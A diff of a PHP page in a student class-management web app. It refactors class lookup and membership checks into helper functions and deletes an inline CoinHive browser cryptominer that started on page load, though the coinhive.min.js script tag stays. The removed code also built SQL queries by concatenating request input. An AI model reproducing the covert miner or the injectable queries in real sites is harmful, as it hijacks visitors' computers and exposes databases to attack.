@@ -19,28 +19,15 @@
   //Get the db Referance
   $db = getDB();
 
+  //Get this class
+  $class = getClass($db, $_GET['class']);
 
-  //if(strcmp($_GET['page'], 'joinClass')) {
-    //Get this class
-    $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
-    $result = $db->query($query) or die($db->error);
-    $class = $result->fetch_assoc();
-    //Check to see if student is actually in this class
-    $belongs = false;
-    $query = "SELECT class_id FROM userClasses WHERE user_id = " . $_SESSION['id'];
-    $result = $db->query($query) or die($db->error);
-    while ($oclass = $result->fetch_assoc()) {
-      if($_GET['class'] == $oclass['class_id']) {
-        //user is in this class
-        $belongs = true;
-        break;
-      }
-    }
-    if(!$belongs) {
-      //user is not in this class
-      header("Location: home.php");
-      die("You shall not pass");
-    }
+  //Check to see if student is actually in this class
+  if(!doesBelong($db, $_GET['class'], $_SESSION['id'])) {
+    //user is not in this class
+    header("Location: home.php");
+    die("You shall not pass");
+  }
 
 ?>
 
@@ -51,12 +38,7 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
     <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/home.css">
-    <script>
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-    </script>
-    <!-- End questionable content -->
+
     <!-- The top banner of the webpage -->
     <div class="top">
         <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
